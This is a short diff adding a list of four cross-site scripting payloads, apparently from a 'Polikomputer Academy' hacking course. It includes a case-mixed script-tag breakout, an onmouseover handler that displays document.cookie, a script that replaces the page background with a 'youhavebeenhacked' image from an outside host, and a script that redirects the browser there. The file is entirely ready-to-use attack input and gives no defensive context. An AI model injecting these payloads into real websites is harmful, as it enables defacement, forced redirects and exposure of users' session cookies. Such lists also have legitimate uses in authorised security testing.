@@ -1,0 +1,5 @@
+Payload: 
+1)"><sCrIpT>alert("Polikomputer Academy")</ScRiPt>
+2)<a onmouseover="alert(document.cookie)">Show Cookie</a>
+3)"><script> document.body.backgroundImage= document.body.style.background = "url(http://polikomputer.com/image-morehack/youhavebeenhacked!.png)"</script>
+4) <script>window.location.replace("http://polikomputer.com/image-morehack/youhavebeenhacked!.png")</script>
